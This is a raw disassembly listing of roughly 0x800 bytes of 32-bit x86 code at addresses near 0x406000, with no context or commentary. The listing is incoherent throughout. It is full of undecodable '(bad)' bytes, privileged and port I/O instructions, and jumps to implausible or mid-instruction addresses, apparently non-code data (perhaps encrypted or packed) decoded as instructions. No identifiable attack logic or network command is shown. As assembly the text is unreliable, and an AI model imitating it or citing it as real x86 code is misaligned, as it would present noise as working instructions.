  40619a:	test   eax,0xe93520bb
  40619f:	add    ebp,ebx
  4061a1:	test   eax,0x96dbbbf7
  4061a6:	nop
  4061a7:	mov    es,WORD PTR [ecx+0x4e]
  4061aa:	inc    esp
  4061ab:	out    0x16,eax
  4061ad:	(bad)  
  4061af:	dec    esp
  4061b0:	pop    es
  4061b1:	jae    0x40614a
  4061b3:	ins    BYTE PTR es:[edi],dx
  4061b4:	adc    BYTE PTR [ebx-0x43b329d1],dl
  4061ba:	jcxz   0x4061aa
  4061bd:	rol    DWORD PTR [ecx+0x1593dd97],1
  4061c3:	inc    eax
  4061c4:	mov    BYTE PTR [ebx],0x78
  4061c7:	adc    esi,0x51
  4061ca:	jns    0x4061db
  4061cc:	jge    0x40624d
  4061ce:	lea    edi,[edi]
  4061d0:	inc    edx
  4061d1:	xchg   esi,eax
  4061d2:	into   
  4061d3:	mov    ds:0xb321caaa,al
  4061d8:	mov    al,0x52
  4061da:	aad    0xa1
  4061dc:	fist   WORD PTR [edi+0x1b]
  4061df:	jg     0x40619e
  4061e1:	enter  0xdf43,0x7a
  4061e5:	mov    ecx,ecx
  4061e7:	jno    0x406227
  4061e9:	and    eax,ecx
  4061eb:	pop    es
  4061ec:	pushf  
  4061ed:	mov    ch,0xb9
  4061ef:	mov    al,BYTE PTR [edx+0x44]
  4061f2:	push   0xffffffd7
  4061f4:	jne    0x406256
  4061f6:	enter  0xa33b,0x5c
  4061fa:	loope  0x4061d8
  4061fc:	xchg   esi,eax
  4061fd:	or     ebx,DWORD PTR [ebp-0x5]
  406200:	out    0xa4,al
  406202:	add    BYTE PTR [eax+0x487905a7],ch
  406208:	in     eax,0x86
  40620a:	jns    0x406250
  40620c:	mov    ebx,0x7705dd3a
  406211:	repz adc edi,ecx
  406214:	add    ecx,edx
  406216:	es pop ss
  406218:	dec    ecx
  406219:	leave  
  40621a:	push   ecx
  40621b:	jg     0x406247
  40621d:	push   ebx
  40621e:	adc    BYTE PTR [eax-0x4d0a142d],0x36
  406225:	sbb    ah,dl
  406227:	pop    edi
  406228:	fld    DWORD PTR [ecx-0x58]
  40622b:	and    BYTE PTR [edx+0x53],dl
  40622e:	bound  esp,QWORD PTR [edi-0x14dcd14b]
  406234:	retf   
  406235:	or     al,0xd
  406237:	mov    WORD PTR gs:[edx+0x92564a7],?
  40623e:	(bad)  
  406240:	(bad)  
  406241:	into   
  406242:	cmc    
  406243:	enter  0x525a,0xeb
  406247:	mov    eax,ds:0x7e72bf1a
  40624c:	cmovl  eax,DWORD PTR [edi+0x9]
  406250:	bts    DWORD PTR [edx+0x2e],ebx
  406254:	(bad)  
  406255:	push   eax
  406256:	add    eax,0x7208fd11
  40625b:	repnz cmp al,0x6a
  40625e:	xchg   ebp,eax
  40625f:	add    ecx,0x986c0788
  406265:	ja     0x4062cd
  406267:	xor    BYTE PTR [edi],al
  406269:	and    esp,DWORD PTR [edx-0x63]
  40626c:	jge    0x4062a0
  40626e:	loope  0x4062d2
  406270:	xchg   esi,eax
  406271:	call   0x5bda86c0
  406276:	imul   ecx,DWORD PTR [esi+eax*4-0x13],0x1e
  40627b:	and    BYTE PTR [ebx-0x7b],ch
  40627e:	sbb    DWORD PTR [edi],ecx
  406280:	fsub   st,st(0)
  406282:	adc    eax,0x8ec3a7b3
  406287:	mov    cl,0x86
  406289:	jle    0x4062f5
  40628b:	xchg   esp,eax
  40628c:	jb     0x4062fc
  40628e:	jo     0x406297
  406290:	popa   
  406291:	lds    ecx,FWORD PTR [ebx]
  406293:	sub    bl,BYTE PTR [edi+0x2798e6be]
  406299:	sub    edi,0xffffffbf
  40629c:	es or  al,0xc2
  40629f:	pop    esp
  4062a0:	xchg   edi,eax
  4062a1:	jl     0x40629a
  4062a3:	idiv   DWORD PTR [eax+0x48]
  4062a6:	pop    esi
  4062a7:	mov    ds:0x373f1ba6,al
  4062ac:	repnz sbb eax,0xbfdb4e32
  4062b2:	sbb    bl,BYTE PTR [ebx]
  4062b4:	stc    
  4062b5:	fstp   QWORD PTR [edx+0x25]
  4062b8:	push   ecx
  4062b9:	xchg   esi,eax
  4062ba:	das    
  4062bb:	jb     0x4062b1
  4062bd:	nop
  4062be:	ins    BYTE PTR es:[edi],dx
  4062bf:	push   0xb16eb61e
  4062c4:	push   ecx
  4062c5:	(bad)  
  4062c6:	pushf  
  4062c7:	imul   ebx,DWORD PTR [edi+0x6d3830e8],0xffffffb6
  4062ce:	push   esp
  4062cf:	jb     0x4062dd
  4062d1:	push   ds
  4062d2:	sbb    bl,BYTE PTR ds:0x9de8bc7f
  4062d8:	rcr    BYTE PTR [edi+0x2476bc90],0x33
  4062df:	adc    DWORD PTR [ecx],edi
  4062e1:	fstp   DWORD PTR [ecx-0x2]
  4062e4:	(bad)  
  4062e6:	addr16 mov ds:0x3150,eax
  4062ea:	push   0x16314d3b
  4062ef:	(bad)  
  4062f0:	mov    ah,0xa5
  4062f2:	pop    edi
  4062f3:	pop    edx
  4062f4:	loopne 0x40634e
  4062f6:	dec    esi
  4062f7:	xchg   BYTE PTR [ecx],cl
  4062f9:	call   DWORD PTR [ecx-0x33ca2452]
  4062ff:	ja     0x4062bd
  406301:	inc    eax
  406302:	sti    
  406303:	loop   0x40629f
  406305:	push   eax
  406306:	sub    ebx,ebx
  406308:	xor    eax,0x1a9cfad6
  40630d:	push   cs
  40630e:	xchg   edx,edi
  406310:	sub    cl,BYTE PTR [ebp+0x61f93ce6]
  406316:	test   DWORD PTR [ebp+ebx*4-0x216bb108],0x80ad7a9b
  406321:	(bad)  
  406322:	loopne 0x40637a
  406324:	(bad)  
  406325:	xchg   DWORD PTR [edx-0x3faa13d4],esp
  40632b:	enter  0xbd27,0x16
  40632f:	out    0x66,al
  406331:	add    eax,edx
  406333:	arpl   WORD PTR [eax],cx
  406335:	add    al,0xf8
  406337:	sahf   
  406338:	sbb    edx,eax
  40633a:	sub    esi,DWORD PTR [eax-0x7d]
  40633d:	out    0x4c,eax
  40633f:	in     al,0xc9
  406341:	dec    ebp
  406342:	ja     0x4062cb
  406344:	xor    bl,BYTE PTR [esi-0x1a]
  406347:	add    eax,0xdcbc711e
  40634c:	dec    ecx
  40634d:	cmp    bh,BYTE PTR [esi+0x3d]
  406350:	fld    QWORD PTR [ebx+0x1c]
  406353:	fadd   DWORD PTR [ebp-0x17]
  406356:	pop    edi
  406357:	mov    ds:0xfabb4b4c,eax
  40635c:	aas    
  40635d:	ret    
  40635e:	xchg   DWORD PTR [eax+ebp*2+0x75],edi
  406362:	mov    esp,0x501a42a4
  406367:	push   ds
  406368:	xchg   BYTE PTR [ecx+0x39a51f0f],cl
  40636e:	mov    dh,0x75
  406370:	iret   
  406371:	and    ebx,ebp
  406373:	jmp    0x4063ae
  406375:	rcl    BYTE PTR ds:0x507f675a,0x0
  40637c:	rcr    BYTE PTR [eax],1
  40637e:	add    edi,DWORD PTR [edx-0x3f02abd5]
  406384:	js     0x40636e
  406386:	xor    ah,BYTE PTR [esi]
  406388:	push   edi
  406389:	in     al,dx
  40638a:	pop    ebx
  40638b:	cwde   
  40638c:	jmp    0x7162edae
  406391:	test   al,0x58
  406393:	sub    DWORD PTR [edi],ebp
  406395:	ret    
  406396:	jge    0x4063a6
  406398:	sbb    DWORD PTR [ebx],edx
  40639a:	jno    0x4063b8
  40639c:	mov    ds:0xc0ddfd0e,eax
  4063a1:	data16 sti 
  4063a3:	cmc    
  4063a4:	push   0x73
  4063a6:	xchg   ebp,eax
  4063a7:	push   ebp
  4063a8:	sbb    DWORD PTR [ebx],0xbcb43223
  4063ae:	mov    dl,0x25
  4063b0:	pushf  
  4063b1:	popa   
  4063b2:	and    eax,0xcac7fe7d
  4063b7:	(bad)  
  4063b8:	jmp    0x40638d
  4063ba:	mov    WORD PTR [edx+0x72403e1e],cs
  4063c0:	inc    ebp
  4063c1:	out    dx,eax
  4063c2:	mov    edi,0xf3f85238
  4063c7:	sub    bh,dh
  4063c9:	icebp  
  4063ca:	ret    0xbc85
  4063cd:	xchg   edx,eax
  4063ce:	popf   
  4063cf:	hlt    
  4063d0:	add    al,BYTE PTR [ecx+0x572fc2e5]
  4063d6:	pushf  
  4063d7:	leave  
  4063d8:	pop    eax
  4063d9:	mov    ds:0xde1b75b5,al
  4063de:	frstor [esi]
  4063e0:	adc    al,0x37
  4063e2:	test   DWORD PTR [edx],ebx
  4063e4:	scas   eax,DWORD PTR es:[edi]
  4063e5:	fsubr  DWORD PTR [eax-0x80]
  4063e8:	test   DWORD PTR ds:0x6f9805a6,0x85a3d447
  4063f2:	mov    al,ds:0xbe6fab62
  4063f7:	mov    bl,0x8a
  4063f9:	std    
  4063fa:	std    
  4063fb:	mov    al,ds:0xc4d45793
  406400:	aas    
  406401:	sub    edi,edi
  406403:	dec    edi
  406404:	shl    BYTE PTR [esi-0x7e],cl
  406407:	leave  
  406408:	xor    al,0x40
  40640a:	das    
  40640b:	aam    0x1e
  40640d:	pusha  
  40640e:	cdq    
  40640f:	ss out 0xff,eax
  406412:	or     DWORD PTR [ebp+0x3a31760],esp
  406418:	sub    eax,0xf0c966a1
  40641d:	push   ecx
  40641e:	ds pop eax
  406420:	mov    esi,0x6268def5
  406425:	retf   0x40ad
  406428:	sahf   
  406429:	xchg   edi,eax
  40642a:	push   ebp
  40642b:	or     eax,0x64582506
  406430:	ret    
  406431:	(bad)  
  406432:	(bad)  
  406433:	lods   eax,DWORD PTR ds:[esi]
  406434:	jae    0x406481
  406436:	test   DWORD PTR [eax-0x133466d1],0xdda3e5ef
  406440:	lods   eax,DWORD PTR ds:[esi]
  406441:	not    BYTE PTR [esi+0x27abcafb]
  406447:	inc    ebp
  406448:	test   eax,0x57ce8454
  40644d:	(bad)  
  40644f:	fidiv  DWORD PTR [ebp*1+0x22396b08]
  406456:	scas   eax,DWORD PTR es:[edi]
  406457:	pop    eax
  406458:	jg     0x406414
  40645a:	inc    BYTE PTR [ebx+0x0]
  40645d:	mov    al,ds:0xfaa54f50
  406462:	push   edx
  406463:	rcl    BYTE PTR [edi+edi*8],1
  406466:	mov    WORD PTR [edx],cs
  406468:	or     eax,0xb0ef8e1d
  40646d:	sti    
  40646e:	xchg   esi,eax
  40646f:	sbb    eax,ecx
  406471:	push   es
  406472:	test   WORD PTR [ebx-0x83d3afc],sp
  406479:	xchg   ebx,eax
  40647a:	inc    ebp
  40647b:	mov    eax,ds:0xf156c98d
  406480:	and    BYTE PTR [edx-0x3b],dl
  406483:	fs sub al,0x1
  406486:	outs   dx,BYTE PTR ds:[esi]
  406487:	pop    ss
  406488:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40648a:	mov    esi,DWORD PTR [esi+ebp*8]
  40648d:	lds    edi,FWORD PTR [edx-0x23]
  406490:	cvtpi2ps xmm3,QWORD PTR [edx-0x3bf6c7f2]
  406497:	ret    0xca1e
  40649a:	sti    
  40649b:	lock cmp DWORD PTR [edx-0xf],ebx
  40649f:	sbb    eax,0xe759b685
  4064a4:	xor    eax,0xa4f67a5d
  4064a9:	dec    ebp
  4064aa:	or     al,0xd2
  4064ac:	imul   ebp,DWORD PTR [ecx-0x4c],0x3f
  4064b0:	leave  
  4064b1:	add    esi,edi
  4064b3:	sub    ebp,DWORD PTR [edi+0x6c8e0bb0]
  4064b9:	leave  
  4064ba:	popf   
  4064bb:	push   cs
  4064bc:	cmp    eax,0x771bd41d
  4064c1:	sbb    DWORD PTR [ebx-0x3c80b42b],ebp
  4064c7:	loopne 0x406511
  4064c9:	gs jge 0x40646d
  4064cc:	mov    edi,0xa7cbaf3d
  4064d1:	popa   
  4064d2:	bound  edi,QWORD PTR [eax+0xec8b727]
  4064d8:	out    dx,al
  4064d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064da:	arpl   sp,bx
  4064dc:	int    0xbc
  4064de:	scas   al,BYTE PTR es:[edi]
  4064df:	mov    ecx,0x51e2882f
  4064e4:	fimul  DWORD PTR [eax+eax*8+0x6aea27b9]
  4064eb:	pop    esp
  4064ec:	or     DWORD PTR [esi-0x2bc172d7],0x5be119b0
  4064f6:	xchg   esp,eax
  4064f7:	pop    ebx
  4064f8:	xchg   edx,ebp
  4064fa:	xor    ebp,esp
  4064fc:	xchg   ch,ch
  4064fe:	bound  eax,QWORD PTR [ebx]
  406500:	push   edi
  406501:	scas   eax,DWORD PTR es:[edi]
  406502:	gs sbb eax,0x63fe882
  406508:	cmp    bh,BYTE PTR [eax]
  40650a:	cli    
  40650b:	sub    BYTE PTR [esi-0x54556fe9],ah
  406511:	aam    0x1
  406513:	ins    DWORD PTR es:[edi],dx
  406514:	mov    ch,0xea
  406516:	push   cs
  406517:	inc    esp
  406518:	pop    ss
  406519:	push   ds
  40651a:	xlat   BYTE PTR ds:[ebx]
  40651b:	cmp    BYTE PTR ds:0x53f39022,0x87
  406522:	or     eax,0xc404d1f2
  406527:	fsub   DWORD PTR [ecx]
  406529:	adc    ebx,ecx
  40652b:	in     eax,dx
  40652c:	mov    al,ch
  40652e:	xor    ebp,ecx
  406530:	inc    ebx
  406531:	jmp    0x63b22922
  406536:	test   al,0xc5
  406538:	je     0x40651e
  40653a:	mov    ebx,0x725a8aad
  40653f:	dec    edi
  406540:	xchg   ebp,eax
  406541:	outs   dx,BYTE PTR ds:[esi]
  406542:	or     al,0x85
  406544:	jo     0x40652f
  406546:	mov    dh,0x24
  406548:	jae    0x4064e9
  40654a:	sbb    ah,bl
  40654c:	or     al,0x9
  40654e:	popf   
  40654f:	xchg   ecx,edx
  406551:	mov    eax,DWORD PTR [esp+edx*8-0x45fa210]
  406558:	inc    ebx
  406559:	mov    esp,0x9e6e547a
  40655e:	sub    bh,BYTE PTR [edi]
  406560:	inc    DWORD PTR es:[esi+0x7201c769]
  406567:	dec    ecx
  406568:	cwde   
  406569:	xchg   ecx,eax
  40656a:	clc    
  40656b:	imul   ebp,DWORD PTR [esi],0xffffff85
  40656e:	xchg   ebx,eax
  40656f:	retf   0xbcb4
  406572:	pushf  
  406573:	fild   DWORD PTR [eax+0x4cac6c47]
  406579:	adc    ebx,DWORD PTR [eax+0x35]
  40657c:	popa   
  40657d:	xor    edi,ebp
  40657f:	push   esp
  406580:	dec    esi
  406581:	jne    0x40655f
  406583:	jmp    FWORD PTR [ebx-0x1d2695a2]
  406589:	adc    eax,0xc70b46fd
  40658e:	adc    DWORD PTR [edi-0x65],0x74
  406592:	cmp    DWORD PTR [esi+0x606ff3b5],ebx
  406598:	xchg   esi,eax
  406599:	jbe    0x4065f8
  40659b:	inc    edx
  40659c:	in     eax,dx
  40659d:	(bad)  
  40659e:	mov    esp,0x88d49dbc
  4065a3:	nop
  4065a4:	clc    
  4065a5:	jb     0x40661c
  4065a7:	pop    es
  4065a8:	or     DWORD PTR [eax-0x51a87989],eax
  4065ae:	xchg   BYTE PTR [ecx+0x1],bh
  4065b1:	ror    BYTE PTR [esi],0xc8
  4065b4:	mov    ah,0xbd
  4065b6:	or     BYTE PTR [esi+0x3abda2d7],dh
  4065bc:	ins    DWORD PTR es:[edi],dx
  4065bd:	mov    ds:0xf0db2d4b,al
  4065c2:	cmp    BYTE PTR [ecx],bh
  4065c4:	xor    ah,BYTE PTR [edx+0x3bf021c3]
  4065ca:	and    eax,ebx
  4065cc:	mov    dl,0xaa
  4065ce:	dec    ecx
  4065cf:	cmp    DWORD PTR [edi-0x80],eax
  4065d2:	enter  0x7662,0xd0
  4065d6:	ins    BYTE PTR es:[edi],dx
  4065d7:	into   
  4065d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d9:	mov    dl,0x65
  4065db:	mov    al,0x1d
  4065dd:	push   esi
  4065de:	add    ch,ch
  4065e0:	frstor [ecx+ebp*4-0x27ab2f27]
  4065e7:	xchg   edi,eax
  4065e8:	dec    edx
  4065e9:	mov    bh,0xf2
  4065eb:	and    BYTE PTR [edx+0x253b2cfb],bl
  4065f1:	pop    edi
  4065f2:	cmp    ecx,0x48
  4065f5:	fimul  DWORD PTR [ebp+0xcf46069]
  4065fb:	jg     0x4065b8
  4065fd:	(bad)  
  4065fe:	xor    al,0x35
  406600:	or     al,BYTE PTR [edi-0x4a8a401b]
  406606:	(bad)  
  406607:	lahf   
  406608:	adc    DWORD PTR [ebx],ebp
  40660a:	(bad)  
  40660b:	cmp    BYTE PTR [esi+ebp*2-0x5e1f81c1],bh
  406612:	jg     0x40662d
  406614:	enter  0x5e4f,0x2a
  406618:	ror    DWORD PTR [eax],1
  40661a:	dec    esp
  40661b:	xchg   esp,eax
  40661c:	addr16 mov al,ds:0x99f4
  406620:	jno    0x406654
  406622:	stc    
  406623:	sub    eax,0xa341fa2c
  406628:	adc    eax,DWORD PTR [ecx-0x42bc7d17]
  40662e:	push   ebp
  40662f:	ins    BYTE PTR es:[edi],dx
  406630:	push   0xffffff98
  406632:	ror    esp,1
  406634:	cli    
  406635:	and    al,0x7c
  406637:	xor    DWORD PTR [ebp+0x69c470ca],ecx
  40663d:	push   cs
  40663e:	sub    ebp,DWORD PTR [edi-0x5c7bae7e]
  406644:	push   esp
  406645:	ss ds cmc 
  406648:	fdiv   DWORD PTR [ecx+0x65]
  40664b:	das    
  40664c:	(bad)  
  40664d:	jmp    0x4066b2
  40664f:	push   es
  406650:	inc    ebp
  406651:	loope  0x4066d0
  406653:	mov    ah,0x15
  406655:	add    ecx,DWORD PTR ds:0xbfde9c9d
  40665b:	cmp    al,0x54
  40665d:	cmp    BYTE PTR [esi-0x5a],0x64
  406661:	repnz mov eax,ds:0x605cf6e4
  406667:	and    DWORD PTR [ebx+0x6123c792],esi
  40666d:	mov    al,0x2b
  40666f:	arpl   WORD PTR [ebp-0x6c],ax
  406672:	bound  eax,QWORD PTR [edi+ecx*2-0x2b72aa2e]
  406679:	inc    ecx
  40667a:	dec    esp
  40667b:	dec    esp
  40667c:	xchg   edx,ebx
  40667e:	mov    cl,ch
  406680:	xchg   ebx,eax
  406681:	scas   eax,DWORD PTR es:[edi]
  406682:	jae    0x406607
  406684:	aaa    
  406685:	jns    0x406633
  406687:	(bad)  
  406688:	and    dh,BYTE PTR [ecx+ecx*1+0x74]
  40668c:	int    0x63
  40668e:	jne    0x406698
  406690:	dec    ebx
  406691:	pop    ds
  406692:	call   0xa373:0xa50fa130
  406699:	(bad)  
  40669a:	enter  0x6118,0x8e
  40669e:	addr16 mov al,0xaf
  4066a1:	mov    ch,0x2e
  4066a3:	pop    ecx
  4066a4:	jmp    FWORD PTR [ebx]
  4066a6:	push   cs
  4066a7:	lahf   
  4066a8:	shl    bh,0x54
  4066ab:	les    edx,FWORD PTR [edi-0x43ec7272]
  4066b1:	or     ch,BYTE PTR [eax]
  4066b3:	jae    0x4066da
  4066b5:	fld    TBYTE PTR [edx]
  4066b7:	fwait
  4066b8:	jecxz  0x4066f4
  4066ba:	pop    edx
  4066bb:	add    al,0x4f
  4066bd:	dec    esp
  4066be:	mov    ah,0xe2
  4066c0:	mov    gs,WORD PTR [ebx]
  4066c2:	cs sub ecx,ebp
  4066c5:	neg    DWORD PTR [edx-0x4439748d]
  4066cb:	dec    ebp
  4066cc:	in     eax,dx
  4066cd:	adc    eax,0x26b7271c
  4066d2:	(bad)  
  4066d4:	in     eax,0x45
  4066d6:	lahf   
  4066d7:	cmp    BYTE PTR [ecx*4+0x2cca068],dh
  4066de:	dec    eax
  4066df:	int3   
  4066e0:	sub    DWORD PTR [edi+ebp*1],eax
  4066e3:	mov    edx,cs
  4066e5:	mov    esp,0x8fe56cfb
  4066ea:	sbb    DWORD PTR [eax],0x73cd91e8
  4066f0:	jae    0x4066ef
  4066f2:	add    DWORD PTR [esi-0x1d],eax
  4066f5:	ja     0x406730
  4066f7:	lock stos BYTE PTR es:[edi],al
  4066f9:	imul   edx,DWORD PTR [esi-0x2e],0xe64a6bc3
  406700:	jne    0x406700
  406702:	sub    DWORD PTR [ecx-0x86a9759],ebx
  406708:	retf   
  406709:	repz rcr BYTE PTR [esp+edx*1],1
  40670d:	add    eax,0xe0a6adf2
  406712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406713:	fdivr  st,st(7)
  406715:	inc    edx
  406716:	aas    
  406717:	cwde   
  406718:	fstp   QWORD PTR [edx+0x79]
  40671b:	ins    BYTE PTR es:[edi],dx
  40671c:	sbb    al,0x29
  40671e:	call   FWORD PTR [ebp-0x5f]
  406721:	(bad)  
  406722:	cmp    al,BYTE PTR [eax+0x6b6771e2]
  406728:	mov    ecx,DWORD PTR [eax-0x5]
  40672b:	les    ecx,FWORD PTR [edx-0xb]
  40672e:	call   0x41df739b
  406733:	rol    DWORD PTR [eax],0x52
  406736:	xchg   esp,eax
  406737:	inc    edx
  406738:	xor    eax,0xcf7b2c65
  40673d:	push   ecx
  40673e:	adc    ecx,DWORD PTR [ebp-0x61]
  406741:	rol    BYTE PTR [ebx-0x63],cl
  406744:	mov    ecx,0x2352f84e
  406749:	in     al,dx
  40674a:	add    eax,0x73697770
  40674f:	mov    al,ds:0xe0c458e4
  406754:	inc    edi
  406755:	les    ecx,FWORD PTR [edx+esi*8-0x2a9a254]
  40675c:	in     al,dx
  40675d:	push   ebp
  40675e:	jecxz  0x4067bb
  406760:	out    0x79,al
  406762:	(bad)  
  406763:	mov    ebp,0x12e339eb
  406768:	clc    
  406769:	push   esi
  40676a:	mov    gs,WORD PTR [eax-0x15a91e77]
  406770:	inc    edi
  406771:	inc    esp
  406772:	or     edi,DWORD PTR ds:0x8a180eb0
  406778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406779:	adc    BYTE PTR [eax],dh
  40677b:	and    al,0x21
  40677d:	into   
  40677e:	mov    ebx,0x847c6adb
  406783:	(bad)  
  406785:	out    dx,eax
  406786:	(bad)  
  406787:	hlt    
  406788:	pop    ebp
  406789:	fs xchg ebx,eax
  40678b:	leave  
  40678c:	mov    edi,0xc4a30b41
  406791:	icebp  
  406792:	xor    DWORD PTR [ebp-0x32bc6d70],ecx
  406798:	push   esp
  406799:	fs retf 
  40679b:	xor    esp,DWORD PTR [ebx-0x6b]
  40679e:	out    dx,al
  40679f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a0:	jle    0x4067ae
  4067a2:	mov    esi,0xbf47b1a8
  4067a7:	cli    
  4067a8:	cmp    ah,bh
  4067aa:	jne    0x4067b7
  4067ac:	dec    DWORD PTR [esi]
  4067ae:	(bad)  
  4067af:	mov    dl,BYTE PTR [ecx]
  4067b1:	jmp    0x3605:0x18b55714
  4067b8:	loope  0x406740
  4067ba:	dec    ecx
  4067bb:	mov    ebx,0x8fc88301
  4067c0:	pop    ebx
  4067c1:	retf   0x61fd
  4067c4:	xchg   ebp,eax
  4067c5:	loop   0x4067ea
  4067c7:	adc    eax,ecx
  4067c9:	push   DWORD PTR [ebp+0x8]
  4067cc:	jl     0x40675a
  4067ce:	mov    al,ds:0x9e387612
  4067d3:	pop    esp
  4067d4:	aaa    
  4067d5:	and    DWORD PTR [ebp-0x26],eax
  4067d8:	and    BYTE PTR [eax],ch
  4067da:	shl    DWORD PTR [ebp+0x63],cl
  4067dd:	cwde   
  4067de:	dec    eax
  4067df:	xor    edi,DWORD PTR [edi+0x147a4663]
  4067e5:	push   esp
  4067e6:	mov    eax,ds:0xdb2d2e32
  4067eb:	sbb    BYTE PTR [ebp+0x15],0xf2
  4067ef:	js     0x4067de
  4067f1:	outs   dx,BYTE PTR ds:[esi]
  4067f2:	inc    ebx
  4067f3:	mov    eax,ds:0x2c39e064
  4067f8:	shl    BYTE PTR [ecx],cl
  4067fa:	hlt    
  4067fb:	sub    al,0x69
  4067fd:	fidiv  DWORD PTR [ebx+0x47]
  406800:	gs pop edi
  406802:	daa    
  406803:	sub    bh,bl
  406805:	scas   al,BYTE PTR es:[edi]
  406806:	repnz lods al,BYTE PTR ds:[esi]
  406808:	ret    0x264c
  40680b:	xchg   ebp,eax
  40680c:	and    bl,BYTE PTR [edx-0x49]
  40680f:	cmc    
  406810:	mov    al,ds:0x19120f54
  406815:	sub    BYTE PTR [ebp+edx*8-0x7a],ch
  406819:	retf   0x8b3c
  40681c:	dec    edi
  40681d:	(bad)  
  40681e:	hlt    
  40681f:	imul   ebp,DWORD PTR [edx+0x34],0x66
  406823:	lods   eax,DWORD PTR ds:[esi]
  406824:	lock fucomip st,st(2)
  406827:	in     eax,0xee
  406829:	out    dx,al
  40682a:	out    0x33,eax
  40682c:	fcmove st,st(0)
  40682e:	mov    dl,0xcd
  406830:	test   BYTE PTR fs:[esi],cl
  406833:	retf   0x7e28
  406836:	jnp    0x4067ef
  406838:	mov    bl,0x34
  40683a:	jl     0x40682c
  40683c:	loop   0x4067e0
  40683e:	add    bl,bl
  406840:	sbb    BYTE PTR [edx-0x663682b7],cl
  406846:	iret   
  406847:	mov    dl,0xa7
  406849:	mov    cl,0x14
  40684b:	mov    dl,0x39
  40684d:	dec    esi
  40684e:	or     bl,BYTE PTR [esp+esi*8+0x69b8d868]
  406855:	mov    ds:0xb077c70b,eax
  40685a:	in     eax,dx
  40685b:	pop    ss
  40685c:	mov    ebx,0x29959402
  406861:	xchg   ebp,eax
  406862:	push   0x3697a3f2
  406867:	pusha  
  406868:	inc    edx
  406869:	shr    BYTE PTR [eax-0x56216384],0xa3
  406870:	loop   0x40680c
  406872:	js     0x4068d8
  406874:	and    eax,DWORD PTR [eax-0x41b44c91]
  40687a:	mov    ecx,0x9ea49309
  40687f:	mov    edi,0xe2ca71a1
  406884:	jno    0x40686f
  406886:	mov    edi,0x767e4bc
  40688b:	or     al,0xa3
  40688d:	(bad)  
  40688e:	sbb    al,0x1b
  406890:	sahf   
  406891:	sbb    ecx,DWORD PTR [edx+0x27ff8519]
  406897:	imul   esi,DWORD PTR [ecx],0xffffffa9
  40689a:	pop    ds
  40689b:	pushf  
  40689c:	add    eax,0x227b1385
  4068a1:	leave  
  4068a2:	jno    0x406886
  4068a4:	int3   
  4068a5:	cmp    ah,dh
  4068a7:	pop    ss
  4068a8:	mov    edx,ebp
  4068aa:	pop    DWORD PTR [ecx+ebx*8-0x451b6a99]
  4068b1:	pop    ebp
  4068b2:	pop    es
  4068b3:	pop    ss
  4068b4:	adc    bl,BYTE PTR [edi]
  4068b6:	jge    0x4068f4
  4068b8:	dec    ebx
  4068b9:	mov    ch,0xc4
  4068bb:	sub    BYTE PTR [ebx-0x1275aa5f],bh
  4068c1:	(bad)  
  4068c2:	xchg   edi,eax
  4068c3:	sbb    al,0xa4
  4068c5:	(bad)  
  4068c6:	shl    BYTE PTR [edi-0x6b641e24],0xa5
  4068cd:	sub    edi,DWORD PTR [edx+0x7d]
  4068d0:	adc    DWORD PTR [ebp-0x77],eax
  4068d3:	pop    esi
  4068d4:	xchg   DWORD PTR [esi],ecx
  4068d6:	and    ebx,DWORD PTR ds:0x9895b18
  4068dc:	xchg   edi,eax
  4068dd:	outs   dx,BYTE PTR ds:[esi]
  4068de:	test   eax,0x4790ab1e
  4068e3:	repz dec esp
  4068e5:	push   ds
  4068e6:	or     ah,BYTE PTR [esi]
  4068e8:	push   edi
  4068e9:	xor    eax,0xc7599448
  4068ee:	and    al,0x77
  4068f0:	ror    edi,1
  4068f2:	mov    edx,0x2e67f794
  4068f7:	test   ah,bh
  4068f9:	add    ebp,DWORD PTR [eax-0xa]
  4068fc:	mov    ebx,0x99571281
  406901:	cmp    ch,ah
  406903:	push   esp
  406904:	jmp    0x9ce05251
  406909:	pop    ebp
  40690a:	daa    
  40690b:	mov    BYTE PTR [edi-0x31],al
  40690e:	pusha  
  40690f:	or     edx,DWORD PTR [edx-0x1f]
  406912:	cli    
  406913:	ja     0x406943
  406915:	mov    bh,BYTE PTR [edi-0x11]
  406918:	aaa    
  406919:	ds ss fs rol bh,0xc6
  40691f:	xchg   ebp,eax
  406920:	jne    0x40690b
  406922:	in     eax,0x30
  406924:	pop    es
  406925:	mov    ds:0x1a1b2b4e,eax
  40692a:	sbb    eax,0xbb70ece2
  40692f:	pop    esi
  406930:	sbb    esp,edi
  406932:	rcr    BYTE PTR [esi-0x56],0x57
  406936:	imul   eax,DWORD PTR [eax],0xffffff90
  406939:	mov    cl,0x56
  40693b:	call   0xc5f5:0x5ebd4c6
  406942:	mov    eax,ds:0x51e65025
  406947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406948:	mov    dh,0xad
  40694a:	mov    eax,ds:0xf26a551d
  40694f:	fistp  DWORD PTR [esi-0x50]
  406952:	xor    DWORD PTR [ebx+ecx*2+0x4b],esi
  406956:	loope  0x406910
  406958:	jmp    0xaee5:0x2905f1ae
  40695f:	sub    eax,edi
  406961:	cmp    DWORD PTR [ecx],edi
  406963:	cmp    al,0xc2
  406965:	lods   al,BYTE PTR ds:[esi]
  406966:	cwde   
  406967:	cmc    
  406968:	shl    esp,cl
  40696a:	cmp    DWORD PTR [ebx+0x7e6690a5],0x1a80ca65
  406974:	pop    edx
  406975:	(bad)  
  406976:	aad    0x8a
  406978:	inc    ecx
  406979:	icebp  
  40697a:	in     eax,0x8
  40697c:	bound  esi,QWORD PTR [edx]
  40697e:	(bad)  
  406980:	lahf   
  406981:	pop    eax
  406982:	push   esp
  406983:	in     al,0xfb
  406985:	xchg   BYTE PTR ds:0x9ac5ef10,bl
  40698b:	(bad)  
  40698c:	cmc    
  40698d:	mov    ecx,DWORD PTR [eax-0x27b41246]
  406993:	scas   eax,DWORD PTR es:[edi]
  406994:	inc    esp
  406995:	es jmp 0x6f60d54
  40699b:	addr16 (bad) 
  40699e:	xor    eax,esp
  4069a0:	clc    
  4069a1:	inc    esp
  4069a2:	mov    dx,0xe380
  4069a6:	sti    
  4069a7:	scas   al,BYTE PTR es:[edi]
  4069a8:	pop    eax
  4069a9:	ret    
